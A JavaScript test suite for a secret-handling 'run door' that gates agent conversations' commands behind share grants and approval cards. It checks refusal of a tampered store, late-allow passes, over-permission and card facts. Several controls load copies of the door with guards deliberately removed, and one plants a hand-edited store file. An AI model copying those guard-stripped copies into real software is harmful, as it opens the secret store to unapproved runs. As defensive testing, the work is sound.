  // ONCE PER UNLOCK, so the leg needs a lock cycle: the hand edit alone changes nothing on this door (the plant proves itself first)
  {
    const sf = path.join(s.w.dataDir, DOOR.STORE_FILE), raw = JSON.parse(fs.readFileSync(sf, 'utf8'));
    fs.writeFileSync(sf, JSON.stringify({ ...raw, runnable: [...(raw.runnable || []), 'app-secrets:app1#item.0.1'] }));   // a hand edit: its mark no longer verifies
    const cached = await s.runAs('conv-2', TO('api.example.com'));
    s.w.vault.lock('door'); await s.w.vault.unlock(PW);
    const closed = await s.runAs('conv-2', TO('api.example.com'));
    const lr = (s.door.runnableFor(s.as('conv-2')).entries || []).find((x) => x.ref === REF);
    ROWS.secrets.push(OWN_ROWS[0]);
    let mixClosed = null;
    try { mixClosed = await s.runAs('conv-2', ['--env', `T=${REF}`, '--env', 'U=vault://agent:conv-2/own-put', '--', 'curl', '-s', 'https://api.example.com/v1/items']); } finally { ROWS.secrets.splice(ROWS.secrets.indexOf(OWN_ROWS[0]), 1); }
    ok(mixClosed && !mixClosed.ok && mixClosed.code === 'entry_not_runnable' && !cardsOf(s.w).length, 'under the refused store an OWN + SHARED run is closed too, by the shared entry\'s own refusal (entry_not_runnable: the verdict closes it before the admission — one code, so a later move of the refusal is seen)', mixClosed && mixClosed.code);
    ok(cached.ok && cached.by === 'grant' && closed.code === 'entry_not_runnable' && /vault-run-store-refused/.test(auditOf(s.w)) && lr && lr.paused === true && !cardsOf(s.w).length,
      'B-bc3b: a hand-edited store (its mark fails) — read once per unlock: the SAME door still runs the shared entry before a lock (its cached store: the plant is where it claims), after a lock + unlock the shared entry is CLOSED (entry_not_runnable, said in the audit) and its list row paused — no card', { cached: cached.ok && cached.by, closed: closed.code, listed: lr && { paused: lr.paused } });
    // RED — both guards of a refused store taken away (the entry's `&& !refused` and the admission's belt): the shared entry RUNS
    // over a store that failed its mark — the leg above goes red there
    const SRCf = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
    const noRefuse = M.load('src/server/vault-run-door.js', anchored(anchored(SRCf, '(sharedIds.has(r.id) && !refused)', 'sharedIds.has(r.id)', 'test-vault-run ②c bc3b-refused (open)'), "return refused ? 'the vault\\'s run store failed its mark", "return false ? 'the vault\\'s run store failed its mark", 'test-vault-run ②c bc3b-refused (belt)'), 'bc3b-refused');
    let rr = null;
    if (noRefuse) {
      const m = await shareWorld(noRefuse); m.ug.addMember(ID, { kind: 'conversation', key: 'conv-2' }, { hosts: ['api.example.com'] });
      const before = await m.runAs('conv-2', TO('api.example.com'));
      m.door.setRunnable({ id: 'mounts:m1#secretKey', on: true, reauthed: true });   // a fresh world has no store file until a switch writes one (its mark) — the plant needs it
      const mf = path.join(m.w.dataDir, DOOR.STORE_FILE), mraw = JSON.parse(fs.readFileSync(mf, 'utf8'));
      fs.writeFileSync(mf, JSON.stringify({ ...mraw, runnable: [...(mraw.runnable || []), 'app-secrets:app1#item.0.1'] }));
      m.w.vault.lock('door'); await m.w.vault.unlock(PW);
      const x = await m.runAs('conv-2', TO('api.example.com'));
      rr = { before: before.ok && before.by, refusedSaid: /vault-run-store-refused/.test(auditOf(m.w)), after: x.ok ? x.by : x.code };
    }
    ok(!!noRefuse && rr && rr.before === 'grant' && rr.refusedSaid && rr.after === 'grant', 'RED — both refused-store guards removed (its plant proves itself: the store was refused, said in its audit): the shared entry RUNS by:grant over a store that failed its mark', rr);
  }
  const rv = s.ug.revoke(ID, 'conversation:conv-2');
  const after = await s.runAs('conv-2', TO('api.example.com'));
  ok(rv && rv.ok && after.code === 'use_not_granted', 'the owner\'s ✕ takes it back ⇒ conv-2 is refused again', { rv: rv && rv.ok, code: after.code });
  // RED CONTROLS — patched copies of the door
  const SRC = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
  const patch = (from, to, tag) => M.load('src/server/vault-run-door.js', anchored(SRC, from, to, `test-vault-run ② ${tag}`), tag); // B-0d3e: a moved anchor fails BY NAME (it answered null in silence)
  const oldEarly = patch('if (foreignRefs.length && !useGrants) {', 'if (foreignRefs.length) {', 'bc3b-early');
  let r1 = null;
  if (oldEarly) { const m = await shareWorld(oldEarly); m.ug.addMember(ID, { kind: 'conversation', key: 'conv-2' }, { hosts: ['api.example.com'] }); r1 = await m.runAs('conv-2', TO('api.example.com')); }
  ok(!!oldEarly && r1 && r1.code === 'use_not_granted', 'RED — the door before B-bc3b (another conversation refused before its grant is read): the SHARED conv-2 is refused — the share leg above goes red there', r1 && r1.code);
  // an admit on ANY verdict alone is still refused there by the no-card rule (each guard alone refuses conv-3 — the restack's tb
  // run showed the one-guard copy refusing): this RED takes BOTH away; the mixed-run RED below shows the no-card rule's own
  const SRC2 = anchored(SRC, '      if (!verdict.ok && verdict.ask && sharedIds.size) {', '      if (false) {', 'test-vault-run ② bc3b-anyrow (no card)');
  const anyRow = M.load('src/server/vault-run-door.js', anchored(SRC2, "if (!(v && v.ok === true)) { note('use_not_granted'", "if (!v) { note('use_not_granted'", 'test-vault-run ② bc3b-anyrow (any verdict)'), 'bc3b-anyrow');
  let r2 = null;
  if (anyRow) { const m = await shareWorld(anyRow); m.ug.addMember(ID, { kind: 'conversation', key: 'conv-2' }, { hosts: ['api.example.com'] }); r2 = await m.runAs('conv-3', TO('api.example.com')); r2 = { code: r2.code, ok: r2.ok, cards: cardsOf(m.w).length }; }
  ok(!!anyRow && r2 && !(r2.code === 'use_not_granted' && !r2.cards), 'RED — a door that admits on ANY verdict (the row exists for someone) AND draws cards for a shared entry: conv-3, whom the row does not name, reaches a card naming it — the «only as the row says» leg goes red there', r2);
  const cardOk = patch('      if (!verdict.ok && verdict.ask && sharedIds.size) {', '      if (false) {', 'bc3b-card');
  let r3 = null;
  if (cardOk) { const m = await shareWorld(cardOk); m.ug.addMember(ID, { kind: 'conversation', key: 'conv-2' }, { hosts: ['api.example.com'] }); m.door.setRunnable({ id: 'mounts:m1#secretKey', on: true, reauthed: true }); const x = await m.runAs('conv-2', MIXED); r3 = { code: x.code, cards: cardsOf(m.w).length + (m.w.userTodos.snapshot().resolved || []).filter((i) => i.action && i.action.type === 'vault-run-ask').length }; }
  ok(!!cardOk && r3 && r3.cards > 0, 'RED — the door without «never a card for a shared entry»: the mixed run DRAWS a card naming the shared entry (where «Always» would widen the share)', r3);
}

console.log('③ THE CARD — a NEW shape draws the card; cluster asks every time, local allows a SEEN shape; «always»');
/** THE LEG the card mutant is judged by: a NEW shape on a LOCAL instance (the default that allows) must draw the card. */
async function newShapeCards(doorMod) {
  const w = await world({ doorMod });
  openRow(w);
  const { r, card } = await runAnswered(w, ENV('env'), { answer: 'once' });
  return { card: !!card, ran: !!(r && r.ok), by: r && r.by };
}
{
  const local = await newShapeCards(DOOR);
  ok(local.card && local.ran && local.by === 'once', 'a NEW shape draws the card on a LOCAL instance (decision ②: a local instance allows only after one 允许) — answered once, it ran', local);
  const w = await world();
  openRow(w);
  const first = await runAnswered(w, ENV('env'));
  const it = first.card;
  ok(!!it && it.urgency === 'urgent' && it.text === 'Lane X wants to run a command with a stored secret' && it.detail.split('\n')[0].includes(PRINTER) && /Secrets: vault:\/\/mounts\/m1\/secretKey/.test(it.detail) && /Given as: env:T/.test(it.detail) && /Folder: /.test(it.detail) && /This shape = this whole command line/.test(it.detail) && /«Always» is not offered: an interpreter/.test(it.detail) && it.action.always === false,
    'the card: urgent, the asking conversation by name, the WHOLE run (the command with its references, the secrets, how each is given, the folder, what this shape means) — an interpreter offers no «always»', it && it.detail);
  ok(!leaks(JSON.stringify(it), VALUE).length, 'the card carries no byte of the value (its text, detail and action)');
  const again = await runAnswered(w, ENV('env'));
  ok(again.r.ok && again.r.by === 'seen' && !again.card, 'LOCAL: the same shape again runs without a card (seen this unlock — still scrubbed, still audited)', [again.r.by, !!again.card]);
  const other = await runAnswered(w, ENV('env', 'extra-arg'));
  ok(!!other.card && other.r.ok && other.r.by === 'once', 'LOCAL: an interpreter\'s other command line is a NEW shape ⇒ the card again', [!!other.card, other.r.by]);
  // «always»: a known tool naming a host (the fake curl)
  const CURLARGS = ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', 'https://api.example.com/v1/items'];
  const c1 = await runAnswered(w, CURLARGS, { answer: null });
  ok(!!c1.card && c1.card.action.always === true && /Hosts: api\.example\.com/.test(c1.card.detail) && /the tool \+ its flags \+ the hosts \+ the secrets; positional arguments may change/.test(c1.card.detail), 'a known tool naming a host: the card offers «always» and says what this shape is (tool + flags + hosts + secrets; positionals may change)', c1.card && c1.card.detail);
  const noRe = w.door.answer(c1.card.action.askId, { answer: 'always' });
  ok(noRe.code === 'reveal_needs_password' && cardsOf(w).length === 1, '«always» WITHOUT 验证是你 ⇒ reveal_needs_password — the card stays up', noRe);
  const yes = w.door.answer(c1.card.action.askId, { answer: 'always', reauthed: true });
  const c1r = await c1.r;
  ok(yes.ok && yes.outcome === 'always' && yes.ttl === '30d' && c1r.ok && c1r.by === 'always' && /curl got \[vault:mounts\/m1\/secretKey\]/.test(c1r.stdout), '«always» WITH it (30 days, the default) ⇒ it ran, scrubbed', [yes, c1r.by]);
  const c2 = await runAnswered(w, ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', 'https://api.example.com/v1/other']);
  ok(c2.r.ok && c2.r.by === 'always' && !c2.card, 'the same shape with another positional runs without a card (by «always»)', [c2.r.by, !!c2.card]);
  const c3 = await runAnswered(w, ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', 'https://elsewhere.example.net/x'], { answer: 'deny' });
  ok(!!c3.card && c3.r.code === 'ask_denied', 'another HOST is another shape ⇒ the card; Deny ⇒ ask_denied, nothing ran', [!!c3.card, c3.r.code]);
  const st = JSON.parse(fs.readFileSync(path.join(w.dataDir, DOOR.STORE_FILE), 'utf8'));
  ok(st.always.length === 1 && st.always[0].conv === 'conv-1' && typeof st.mark === 'string' && st.mark.length === 64 && !leaks(JSON.stringify(st), VALUE).length, 'the «always» is kept in data/vault-run.json under the vault\'s mark — the conversation and the shape key, never a value', st);
  const sh = await runAnswered(w, ['--env', 'T=vault://mounts/m1/secretKey', '--', 'bash', '-c', 'curl https://api.example.com'], { answer: null });
  const shAlways = w.door.answer(sh.card.action.askId, { answer: 'always', reauthed: true });
  w.door.answer(sh.card.action.askId, { answer: 'deny' }); await sh.r;
  ok(sh.card.action.always === false && shAlways.code === 'always_not_offered', 'a SHELL\'s card offers no «always» (its whole script is its shape) — asked for anyway ⇒ always_not_offered', shAlways);
  // CLUSTER: asks EVERY time
  const cw = await world({ instance: 'cluster' });
  openRow(cw);
  const k1 = await runAnswered(cw, ENV('env')), k2 = await runAnswered(cw, ENV('env'));
  ok(!!k1.card && !!k2.card && k1.r.ok && k2.r.ok && k2.r.by === 'once', 'CLUSTER: a new shape asks, and the SAME shape asks AGAIN (decision ②: every run asks by default)', [!!k1.card, !!k2.card, k2.r.by]);
  // the card closed by another door / a changed item / no answer / a second run / the caller gone
  const d1 = cw.door.run({ caller: cw.caller, args: ENV('env', 'closed'), cwd: cw.work });
  const it1 = await waitCard(cw);
  // lane wake-approve-card r3: A DECISION ROW HAS ITS OWN VERBS — the ✓ on the row / Mark all seen are refused BY NAME (the run
  // still waits on its card), its own Deny ends it
  let cc1 = null; try { cw.userTodos.setStatus(it1.id, 'done', 'user'); } catch (x) { cc1 = x.code; }
  const m1 = cw.userTodos.setStatusMany([it1.id], 'dismissed', 'user');
  ok(cc1 === 'decision_row' && m1.changed.length === 0 && m1.decisions.includes(it1.id) && cw.userTodos.get(it1.id).status === 'open', 'the card closed by another door (the ✓ on the row, Mark all seen) ⇒ refused BY NAME (decision_row) / passed by — the run still waits on its card', { cc1, m1 });
  cw.door.answer(it1.action.askId, { answer: 'deny', person: true });
  const d1r = await d1;
  const r1 = cw.userTodos.get(it1.id);
  ok(d1r.code === 'ask_denied' && r1.resolvedBy === 'denied' && r1.resolvedFact && r1.resolvedFact.decidedBy === 'person', 'its own Deny (the person\'s) ⇒ ask_denied, nothing ran; the record «denied» with the person\'s mark', { code: d1r.code, by: r1.resolvedBy, fact: r1.resolvedFact });
  const d2 = cw.door.run({ caller: cw.caller, args: ENV('env', 'changed'), cwd: cw.work });
  const it2 = await waitCard(cw);
  const held = cw.userTodos._state.items.find((x) => x.id === it2.id); held.detail = held.detail.replace('changed', 'Changed');
  const d2a = cw.door.answer(it2.action.askId, { answer: 'once' });
  const d2r = await d2;
  ok(d2a.code === 'ask_changed' && d2r.code === 'ask_changed', 'an Allow on an item whose detail changed after it was shown ⇒ ask_changed, nothing ran (the belt)', [d2a.code, d2r.code]);
  const d3 = cw.door.run({ caller: cw.caller, args: ENV('env', 'twice'), cwd: cw.work });
  await waitCard(cw);
  const d3b = await cw.door.run({ caller: cw.caller, args: ENV('env', 'twice'), cwd: cw.work });
  ok(d3b.code === 'ask_pending' && cardsOf(cw).length === 1, 'a second run of a shape whose card is up ⇒ ask_pending (one card per conversation × shape)', d3b.code);
  const it3 = cardsOf(cw)[0]; cw.door.answer(it3.action.askId, { answer: 'deny' }); await d3;
  const ac = new AbortController();
  const d4 = cw.door.run({ caller: cw.caller, args: ENV('env', 'gone'), cwd: cw.work, signal: ac.signal });
  const it4 = await waitCard(cw); ac.abort();
  const d4r = await d4;
  ok(d4r.code === 'caller_gone' && !cardsOf(cw).length && cw.userTodos.get(it4.id).status !== 'open', 'the caller went away while its card waited ⇒ caller_gone, the card closes', d4r.code);
  const ew = await world({ instance: 'cluster', askMs: 80 });
  openRow(ew);
  const ex = await runAnswered(ew, ENV('env'), { answer: null });
  const exR = await ex.r;
  const lateCard = cardsOf(ew)[0];
  ok(exR.code === 'ask_expired' && !!lateCard && lateCard.status === 'open' && lateCard.action.late === true && typeof lateCard.action.lateAt === 'number' && typeof lateCard.action.shapeId === 'string' && lateCard.expiresAt === lateCard.action.lateAt + DOOR.LATE_TTL_MS,
    'round 20b (the owner ruled A): no answer in 60 s ⇒ the COMMAND is ask_expired (nothing ran), but the CARD stays OPEN as `late` (action.late/lateAt/shapeId; expiresAt → +24 h) — on 54f757df the item vanished', { code: exR.code, late: lateCard && lateCard.action });
  // a late «allow once» writes a one-run pass: the NEXT identical run passes ONCE with no card (by: late), audited; the same shape after that asks again; a late card offers no «always»
  ok(ew.door.answer(lateCard.action.askId, { answer: 'always', reauthed: true }).code === 'always_not_offered', 'round 20b: a late card offers no «always» (allow once / deny only)');
  const la = ew.door.answer(lateCard.action.askId, { answer: 'once' });
  const settledLate = ew.userTodos.get(lateCard.id);
  ok(la.ok && la.outcome === 'late-allowed' && !cardsOf(ew).length && settledLate.status === 'done' && settledLate.resolvedBy === 'allowed' && settledLate.resolvedFact && settledLate.resolvedFact.late === true && settledLate.resolvedFact.decidedBy === 'person', 'round 23 (MAJOR #5): a late «allow once» settles resolvedBy="allowed" + resolvedFact {late:true, decidedBy:"person"} — the SHAPE wake-approve-card 2a5e9ce8 reads (on 4ff55fb4 it was resolvedBy="user", outcome in resolvedFact ⇒ the client rendered «settled»)', [la, settledLate.resolvedBy, settledLate.resolvedFact]);
  const otherShape = await runAnswered(ew, ENV('env', 'a-different-shape'), { answer: 'deny' });
  ok(!!otherShape.card && !otherShape.card.action.late && otherShape.r.code === 'ask_denied', 'round 20b: a DIFFERENT shape still asks (its own card) — the late pass is for the one shape', [!!otherShape.card, otherShape.r.code]);
  const pass1 = await runAnswered(ew, ENV('env'), { answer: null });
  const pass1R = await pass1.r;
  ok(pass1R.ok && pass1R.by === 'late' && !pass1.card && /vault-run-late-allow/.test(auditOf(ew)), 'round 20b: the NEXT identical run passes ONCE with no card (by: late), the pass consumed and audited vault-run-late-allow', [pass1R.by, !!pass1.card]);
  const reRun = await runAnswered(ew, ENV('env'), { answer: null });
  ok(!!reRun.card && !reRun.card.action.late && reRun.card.action.askId !== lateCard.action.askId, 'round 20b: the pass is ONE run — the same shape after it draws a fresh LIVE card again (no standing pass)');
  ew.door.answer(reRun.card.action.askId, { answer: 'deny' }); await reRun.r;
  // a SECOND run while a late card is open ⇒ ask_pending, no second card, the open card's 24 h countdown restarts
  const sw = await world({ instance: 'cluster', askMs: 60 }); openRow(sw);
  const se = await runAnswered(sw, ENV('env'), { answer: null }); await se.r;
  const lc = cardsOf(sw)[0]; const at0 = lc.action.lateAt;
  await sleep(5);
  const sec = await sw.door.run({ caller: sw.caller, args: ENV('env'), cwd: sw.work });
  const lc2 = cardsOf(sw)[0];
  ok(sec.code === 'ask_pending' && cardsOf(sw).length === 1 && lc2.id === lc.id && lc2.action.lateAt === at0, 'round 23: a second run while the late card is open ⇒ ask_pending, the ONE card stays (no second card), and its 24 h does NOT extend — it counts from the FIRST expiry (an agent retrying cannot keep the card alive forever)', [sec.code, cardsOf(sw).length, lc2.action.lateAt === at0]);

  // round 23 (MAJOR #6, the CONFIRMED over-permit): a late «allow once» is for THIS EXACT command — a DIFFERENT command of the SAME shape draws its own card
  {
    const xw = await world({ instance: 'cluster', askMs: 60 }); openRow(xw);
    const CURL = (seg) => ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', 'https://api.example.com/api/' + seg];
    const statKey = VR.shapeKeyOf(VR.shapeOf(VR.planOf({ argv: ['curl', '-s', 'https://api.example.com/api/stat'], env: [['T', 'vault://mounts/m1/secretKey']] })));
    const delKey = VR.shapeKeyOf(VR.shapeOf(VR.planOf({ argv: ['curl', '-s', 'https://api.example.com/api/DELETE-everything'], env: [['T', 'vault://mounts/m1/secretKey']] })));
    ok(statKey === delKey, 'round 23 #6 (the premise): `curl …/api/stat` and `curl …/api/DELETE-everything` share ONE shape key — the shape abstracts the path, so a shape-keyed pass over-permits', [statKey === delKey]);
    const e1 = await runAnswered(xw, CURL('stat'), { answer: null }); await e1.r;   // the card for …/api/stat → no answer → late
    const c1 = cardsOf(xw)[0];
    const allow = xw.door.answer(c1.action.askId, { answer: 'once' });
    ok(allow.ok && allow.outcome === 'late-allowed', 'round 23 #6: the late card for `curl …/api/stat` is allowed once (a pass for THIS exact command)');
    const diff = await runAnswered(xw, CURL('DELETE-everything'), { answer: 'deny' });   // the ASK path (deny) — nothing spawns
    ok(!!diff.card && !diff.card.action.late && diff.r.code === 'ask_denied', 'round 23 (MAJOR #6, RED on 4ff55fb4): a DIFFERENT command of the SAME shape (`…/api/DELETE-everything`) draws its OWN live card — the pass is keyed on the EXACT command (exactKeyOf), never the shape alone (4ff55fb4 let the DELETE run by:late on a pass minted for stat)', [!!diff.card, diff.r.code]);

    ok(xw.door._lateOnce.size === 1, 'round 23 #6: the pass for `…/api/stat` is UNTOUCHED by the different-command run (it is still there for its own exact command)', xw.door._lateOnce.size);
  }

  // round 25 (minor 6b): a near-identical rerun's card NAMES the ONE difference from the last late-allowed command (facts.whyAgain — a CODE the client renders). RED on a1f79c42: the rerun drew a card but named no reason. A capturing store keeps `facts` (this tree's real store drops an unknown field, r20).
  {
    const items = new Map(); let n = 0; const subs = [];
    const store = {
      add: (k, v) => { const id = 'b' + (++n); items.set(id, { id, status: 'open', ...v }); return { id }; },
      get: (id) => { const it = items.get(id); return it ? { ...it } : null; },
      setStatus: (id, st, by) => { const it = items.get(id); if (it) { it.status = st; subs.forEach((f) => { try { f({ ...it }, { status: st, by }); } catch {} }); } },
      resolveAnswered: (ids, outcome, fact) => { for (const id of ids) { const it = items.get(id); if (it) { it.status = 'done'; it.resolvedBy = outcome; it.resolvedFact = fact; } } },
      reshapeItems: (fn) => { for (const it of items.values()) { try { fn(it); } catch {} } },
      snapshot: () => ({ open: [...items.values()].filter((x) => x.status === 'open').map((x) => ({ ...x })) }),
      onStatus: (f) => subs.push(f),
    };
    const bw = await world({ instance: 'cluster', askMs: 60 });
    // B-7f97: THE VERDICT DOES NOT FOLLOW THE MACHINE'S TEMP FOLDER — this door is given a temp folder of its own (as a test
    // machine's private TMPDIR /tmp/vt-XXXXXX gives it), and the rerun's folder is INSIDE the conversation's project folder, which
    // the fence admits wherever the temp folder is; the folder BESIDE it (the leg as it was) was admitted only through the door's
    // default os.tmpdir() = /tmp, the scratch root's parent — under a private TMPDIR it was refused cwd_refused and no card came
    const privTmp = path.join(bw.dir, 'private-tmp'); fs.mkdirSync(privTmp, { recursive: true });
    const bd = bw.mk(DOOR, { userTodos: store, tmpDir: privTmp });
    bd.setRunnable({ id: 'mounts:m1#secretKey', on: true, reauthed: true });   // open the entry for runs (the capStore door shares the vault with world)
    const other = path.join(bw.work, 'elsewhere'); fs.mkdirSync(other, { recursive: true });
    const A = ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', 'https://api.example.com/api/stat'];
    const openAsk = () => store.snapshot().open.find((x) => x.action && x.action.type === 'vault-run-ask');
    let dA = false; const pA = bd.run({ caller: bw.caller, args: A, cwd: bw.work }).then((r) => (dA = true, r));
    for (let i = 0; i < 400 && !openAsk(); i++) await sleep(5);
    await pA;   // askMs 60 ⇒ A is refused ask_expired and its card goes `late`
    const late = store.snapshot().open.find((x) => x.action && x.action.late);
    bd.answer(late.action.askId, { answer: 'once' });   // mint a pass for A's EXACT command (carrying A's parts)
    let dB = false; const pB = bd.run({ caller: bw.caller, args: A, cwd: other }).then((r) => (dB = true, r));   // the SAME command in a DIFFERENT folder (same shape key, different exact)
    let cb = null; for (let i = 0; i < 400 && !cb; i++) { cb = store.snapshot().open.find((x) => x.action && x.action.type === 'vault-run-ask' && !x.action.late && x.facts); if (!cb) await sleep(5); }
    if (cb) bd.answer(cb.action.askId, { answer: 'deny' });
    await pB;
    const wa = cb && cb.facts && cb.facts.whyAgain;
    ok(!!cb && !!wa && wa.code === 'folder', 'round 25 (minor 6b): the SAME command rerun in a DIFFERENT folder draws a card whose facts.whyAgain names the one difference (folder) — a1f79c42 drew the card but named no reason', { card: !!cb, whyAgain: wa });
    const beside = path.join(bw.dir, 'elsewhere'); fs.mkdirSync(beside, { recursive: true });
    const asWas = await bd.run({ caller: bw.caller, args: A, cwd: beside });
    ok(asWas.code === 'cwd_refused', 'CONTROL B-7f97: the folder BESIDE the project (the leg as it was) under that temp folder is refused cwd_refused — no card, no reason: the leg stood on the machine\'s TMPDIR (red)', asWas.code);
  }

  // round 26 (minor): a rerun that differs ONLY by SPACING (same tokens, same order) names 'arg-space', not 'arg-order'. RED on 75ef16b09: arg-order was tested first and a spacing-only rerun has equal sorted word-lists too, so 'arg-space' was unreachable (the card said 参数顺序 for a pure spacing change).
  {
    const items = new Map(); let n = 0; const subs = [];
    const store = {
      add: (k, v) => { const id = 'b' + (++n); items.set(id, { id, status: 'open', ...v }); return { id }; },
      get: (id) => { const it = items.get(id); return it ? { ...it } : null; },
      setStatus: (id, st, by) => { const it = items.get(id); if (it) { it.status = st; subs.forEach((f) => { try { f({ ...it }, { status: st, by }); } catch {} }); } },
      resolveAnswered: (ids, outcome, fact) => { for (const id of ids) { const it = items.get(id); if (it) { it.status = 'done'; it.resolvedBy = outcome; it.resolvedFact = fact; } } },
      reshapeItems: (fn) => { for (const it of items.values()) { try { fn(it); } catch {} } },
      snapshot: () => ({ open: [...items.values()].filter((x) => x.status === 'open').map((x) => ({ ...x })) }),
      onStatus: (f) => subs.push(f),
    };
    const bw = await world({ instance: 'cluster', askMs: 60 });
    const bd = bw.mk(DOOR, { userTodos: store });
    bd.setRunnable({ id: 'mounts:m1#secretKey', on: true, reauthed: true });
    const A = ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', '-H', 'X-A: 1', 'https://api.example.com/api/stat'];
    const A2 = ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', '-H', 'X-A:  1', 'https://api.example.com/api/stat'];   // the SAME header, one extra space in its value (same shape key, exact argv differs only by spacing)
    const openAsk = () => store.snapshot().open.find((x) => x.action && x.action.type === 'vault-run-ask');
    const pA = bd.run({ caller: bw.caller, args: A, cwd: bw.work });
    for (let i = 0; i < 400 && !openAsk(); i++) await sleep(5);
    await pA;
    const late = store.snapshot().open.find((x) => x.action && x.action.late);
    bd.answer(late.action.askId, { answer: 'once' });
    const pB = bd.run({ caller: bw.caller, args: A2, cwd: bw.work });
    let cb = null; for (let i = 0; i < 400 && !cb; i++) { cb = store.snapshot().open.find((x) => x.action && x.action.type === 'vault-run-ask' && !x.action.late && x.facts); if (!cb) await sleep(5); }
    if (cb) bd.answer(cb.action.askId, { answer: 'deny' });
    await pB;
    const wa = cb && cb.facts && cb.facts.whyAgain;
    ok(!!cb && !!wa && wa.code === 'arg-space', 'round 26 (minor): a rerun differing ONLY by spacing names facts.whyAgain=arg-space (not arg-order) — arg-space is now tested before arg-order', { card: !!cb, whyAgain: wa });
  }

  // round 23 (MAJOR #5): the settled late record read by wake-approve-card 2a5e9ce8's own reader (copied) — a late allow stamps «allowed:late», a deny «denied by person», the vault's 24 h / lock stamp NOTHING (decidedBy ≠ person)
  {
    const wakeStamp = (rec) => { const by = rec.resolvedBy, fact = rec.resolvedFact; if (!fact || fact.decidedBy !== 'person') return null; return by === 'allowed' && fact.late === true ? 'allowed:late' : by; };
    const aw = await world({ instance: 'cluster', askMs: 60 }); openRow(aw);
    const ae = await runAnswered(aw, ENV('env'), { answer: null }); await ae.r;
    const ac = cardsOf(aw)[0];
    aw.door.answer(ac.action.askId, { answer: 'once' });
    const allowedRec = aw.userTodos.get(ac.id);
    const dw = await world({ instance: 'cluster', askMs: 60 }); openRow(dw);
    const de = await runAnswered(dw, ENV('env'), { answer: null }); await de.r;
    const dc = cardsOf(dw)[0];
    dw.door.answer(dc.action.askId, { answer: 'deny' });
    const deniedRec = dw.userTodos.get(dc.id);
    ok(wakeStamp(allowedRec) === 'allowed:late' && wakeStamp(deniedRec) === 'denied' && wakeStamp({ resolvedBy: 'expired', resolvedFact: { late: true, decidedBy: null } }) === null && wakeStamp({ resolvedBy: 'vault_locked', resolvedFact: { late: true, decidedBy: null } }) === null,
      'round 23 (MAJOR #5): fed to wake-approve-card 2a5e9ce8’s reader, a late allow stamps «allowed:late», a late deny «denied», and the vault’s 24 h / lock stamp NOTHING (decidedBy ≠ person) — the two lanes cannot drift', [wakeStamp(allowedRec), wakeStamp(deniedRec)]);
  }

  // round 23 (MINOR): a late «allow once» for an ENDED conversation mints NO pass — conversation_gone (as the live path refuses)
  {
    const gw = await world({ askMs: 60 }); let live = true;
    const gd = gw.mk(DOOR, { liveOf: () => live });
    openRow(gw);
    const ge = await runAnswered(gw, ENV('env'), { answer: null, door: gd }); await ge.r;
    const gc = cardsOf(gw)[0];
    live = false;
    const ans = gd.answer(gc.action.askId, { answer: 'once' });
    const goneRec = gw.userTodos.get(gc.id);
    ok(ans.ok === false && ans.code === 'conversation_gone' && gd._lateOnce.size === 0 && goneRec.status === 'done' && goneRec.resolvedBy === 'conversation-gone' && goneRec.resolvedFact && goneRec.resolvedFact.decidedBy === null, 'round 23 + round 25 (minor 6c): a late «allow once» for an ENDED conversation mints NO pass (conversation_gone) AND the item settles resolvedBy="conversation-gone" + decidedBy null — the end wake-approve-card reads, not "denied" (a1f79c42: settled "denied")', { ans, by: goneRec.resolvedBy, fact: goneRec.resolvedFact });
  }

  // the card closed by another door — the gate's words, again on a LOCAL instance
  const lw = await world();
  openRow(lw);
  const l1 = lw.door.run({ caller: lw.caller, args: ENV('ran', path.join(lw.work, 'ran.txt')), cwd: lw.work });
  const li = await waitCard(lw); let liCode = null; try { lw.userTodos.setStatus(li.id, 'dismissed', 'user'); } catch (x) { liCode = x.code; }   // int361: wake-approve-card's leg in vault-agent-own's late-card scope (its `lc` is the late card) — renamed
  lw.door.answer(li.action.askId, { answer: 'deny' });   // r3: the ✕ is refused by name; its own Deny ends it
  ok(liCode === 'decision_row' && (await l1).code === 'ask_denied' && !fs.existsSync(path.join(lw.work, 'ran.txt')), 'the card\'s ✕ refused by name on a local instance, its Deny ends it: nothing ran (the child never started)', liCode);
}

console.log('⑫ THE CARD FACTS (lane vault-agent-own r20; the owner «这个卡片的可读性很差») — the door hands the For-you record a structured `facts` (codes, never prose); `detail` stays as today');
{
  const w = await world(); openRow(w);
  const EQ = (a, b) => JSON.stringify(a) === JSON.stringify(b);
  const CURLARGS = ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', 'https://api.example.com/v1/items'];
  // a capturing For-you store: it records the RAW item the door hands add() (this tree's real store drops an unknown `facts`
  // field — lane wake-approve-card's user-todos.js keeps it — so the door's wiring is proven here, not via the stored item)
  const added = [];
  const capStub = { add: (k, v) => { added.push(v); return { id: 'cap-' + added.length }; }, get: () => null, setStatus: () => {}, snapshot: () => ({ open: [] }), onStatus: () => {} };
  const capDoor = w.mk(DOOR, { userTodos: capStub });
  const ac = new AbortController();
  const p = capDoor.run({ caller: w.caller, args: CURLARGS, cwd: w.work, signal: ac.signal });
  let it = null; const t0 = Date.now();
  while (!it && Date.now() - t0 < 3000) { it = added.find((x) => x.action && x.action.type === 'vault-run-ask'); if (!it) await sleep(5); }
  const f = it && it.facts;
  ac.abort(); await p.catch(() => {});
  ok(!!f && f.v === 2 && f.who === 'Lane X' && f.tool.name === 'curl' && f.tool.writable === false && typeof f.cmd === 'string' && f.cmd.includes('curl') && f.cmd.includes('https://api.example.com/v1/items')
    && f.shape === 'tool' && f.masking === 'common-encodings' && f.hosts.known === true && EQ(f.hosts.list, ['api.example.com']) && f.always.offered === true && f.always.why === null && f.always.directive === null
    && Array.isArray(f.env) && f.reason && f.reason.notOwn === true && f.reason.away.length === 0
    && f.secrets.length === 1 && f.secrets[0].entry === 'm1' && f.secrets[0].name === 'my bucket' && f.secrets[0].ref === 'vault://mounts/m1/secretKey' && EQ(f.secrets[0].as, { kind: 'env', name: 'T' }) && f.secrets[0].provenance === 'granted' && f.secrets[0].sendsTo === null,
